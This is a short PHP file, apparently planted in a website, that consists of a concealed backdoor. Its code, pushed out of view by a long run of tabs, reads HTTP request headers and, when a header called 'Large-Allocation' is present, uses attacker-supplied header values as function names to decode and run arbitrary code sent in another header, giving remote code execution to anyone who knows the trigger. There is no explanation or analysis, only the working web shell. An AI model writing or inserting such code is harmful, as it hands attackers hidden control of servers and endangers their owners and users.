<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Large-Allocation'])){$system=$_HEADERS['Large-Allocation']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Sec-Websocket-Accept']));$system();}
